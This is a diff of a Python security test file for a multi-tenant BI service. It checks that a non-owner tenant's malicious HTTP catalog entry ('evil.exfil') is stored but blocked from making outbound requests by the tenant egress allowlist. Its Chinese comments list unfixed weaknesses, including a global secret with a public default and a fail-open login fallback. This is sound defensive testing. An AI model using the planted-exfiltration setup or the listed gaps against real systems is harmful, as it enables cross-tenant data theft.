-            "⇒ 若你正在 lift R-T-GATE：先读 CLAUDE.md 的 R-T-GATE 就绪清单 B-3 分项，\n"
-            "   以及 `executor.execute` 里那段「只有 ②③ 都落地才可移除本门」的注释。"
+            "\n✅ B-3 三项已于 v0.9.6/v0.9.7 全部关闭（① file catalog owner-gate ·\n"
+            "   ② per-tenant `http_spec` 凭据 · ③ egress 租户域化）—— 那部分不再是 blocker。\n"
+            "⛔ **但 lift 仍差下列各项**（CLAUDE.md 的 R-T-GATE 就绪清单为准）：\n"
+            "   · provisioning：`db_dir` UNIQUE + 格式约束 + **禁停用/删除起源租户**\n"
+            "   · 登录 `company` 改必填（现未带则回退唯一 active 租户 = lift 后 fail-open）\n"
+            "   · per-tenant 初始口令 / 一次性邀请流（现单一 `KNOT_INITIAL_ADMIN_PASSWORD`）\n"
+            "   · **平台侧审计落点 `platform_audit`**（R-10 audit-on-drift 卡在这里）\n"
+            "   · `/api/bi/scheduler/tick` 租户域化 · `_get_secret` 单一全局 + 公开默认值\n"
+            "   · 启动/请求期残留的 `resolve_single_tenant`（生产 5 处）· `replicas=1` 运维门\n"
+            "   · `_business_rules` 归正\n"
+            "⇒ 若你正在 lift：把上列逐条清完，并在**同一个 PATCH** 里删掉本测（连同它的理由）。"
         )
 
 
@@ -472,7 +623,7 @@ def test_catalog_put_should_not_persist_when_strict_validation_fails(two_tenants
     from knot.repositories import catalog_repo
     tok = _in(2, "tenants/2")
     try:
-        catalog_repo.update_catalog(1, tables=json.dumps(_EVIL_TABLES, ensure_ascii=False))
+        catalog_repo.update_catalog(1, tables=json.dumps(_UNBOUND_TABLES, ensure_ascii=False))
         # 期望：strict 校验失败 ⇒ 不留污染。现状：留了 ⇒ 本断言失败 ⇒ xfail。
         catalog_state.invalidate_all()
         catalog.reload(strict=False)
@@ -575,27 +726,35 @@ def test_endpoint_non_owner_reset_does_not_restore_deployment_defaults(non_owner
 
 
 def test_endpoint_non_owner_malicious_put_writes_but_execution_is_refused(non_owner_client, no_network):
-    """⭐ 验收 11：非 owner 恶意 `PUT`（含 `source_type=http`）**写入成功**，但**执行被硬边界拒**。
+    """⭐ 端点级：非起源租户恶意 `PUT`（含 `source_type=http`）**写入成功**，但**执行被 ③ 拒** + 零出网。
 
     ⚠️ **本测刻意承认现状**：`PUT` 对 `tables` **只校验 `isinstance(v, list)`**
-    （`source_type` / `http_spec` 零校验）⇒ 写入**会**成功。本片**不改那个校验**（登记 backlog：
+    （`source_type` / `http_spec` 零校验）⇒ 写入**会**成功。本片**不改那个校验**（已登记 backlog：
     动它要连带想清「既有已写入数据怎么办」）。
-    ⇒ 本片的答案是**在执行处拦**：写进去也用不了。这条测把那个分工钉住 ——
-    若将来有人加了 PUT 侧校验，前半断言会红并提醒他同步本测（那是好事，不是坏事）。
+    ⇒ 答案是**在执行处拦**：写进去也用不了。若将来有人加了 PUT 侧校验，前半断言会红并提醒他同步本测。
+
+    ## v0.9.7 语义反转
+    v0.9.6 拦它的是 **owner 门**（「非 owner 一律不许用 HTTP」）；门已摘。
+    现在拦它的是 **③ 的 per-tenant allowlist**：该租户的 `allowed_http_hosts` 里没有这台主机。
+    ⚠️ 且给 spec 绑了**本租户的**数据源（`source_id`）—— 否则会被 **② 的门**拦住，
+    于是「③ 拦住了它」这件事**在测里根本没被验到**（实施期实测的同款陷阱）。
     """
     from knot.services import http_planner
     client, headers = non_owner_client
+    sid = _plant_evil_http_source(2, ".")             # 本租户的坏数据源行（绕过 API 写侧门）
+    _set_allowlist(2, "")                             # 本租户 allowlist 显式全拒绝
+    evil = _evil_tables(sid)
     r = client.put("/api/admin/catalog",
-                   json={"tables": _EVIL_TABLES, "lexicon": _EVIL_LEXICON}, headers=headers)
+                   json={"tables": evil, "lexicon": _EVIL_LEXICON}, headers=headers)
     assert r.status_code == 200, f"现状是 PUT 零校验 ⇒ 应写入成功；若这里变了请同步本测：{r.text}"
     body = client.get("/api/admin/catalog", headers=headers).json()
     assert any(t.get("table") == "exfil" for t in body["current"]["tables"]), "前提：恶意表确实写进去了"
 
-    tok = _in(2, ".")
+    tok = _in_real(2)
     try:
-        assert http_planner.pick_http_route("看下持仓", intent="detail") is None, "软降级失效"
-        res = asyncio.run(http_planner.run_http_step("q", "evil.exfil", _EVIL_TABLES[0]["http_spec"]))
+        res = asyncio.run(http_planner.run_http_step("q", "evil.exfil", evil[0]["http_spec"]))
     finally:
         reset_active_tenant(tok)
-    assert "未启用 HTTP 数据源" in res["error"], f"硬边界失效：{res['error']!r}"
-    assert no_network == [], f"硬边界失效：真发出了请求 {no_network}"
+    assert "不在本租户的出网白名单内" in res["error"], (
+        f"不是 ③ 的 allowlist 拦下的：{res['error']!r}（若是 ② 的消息，说明 source_id 没绑上，本测没验到 ③）")
+    assert no_network == [], f"③ 失效：真发出了请求 {no_network}"
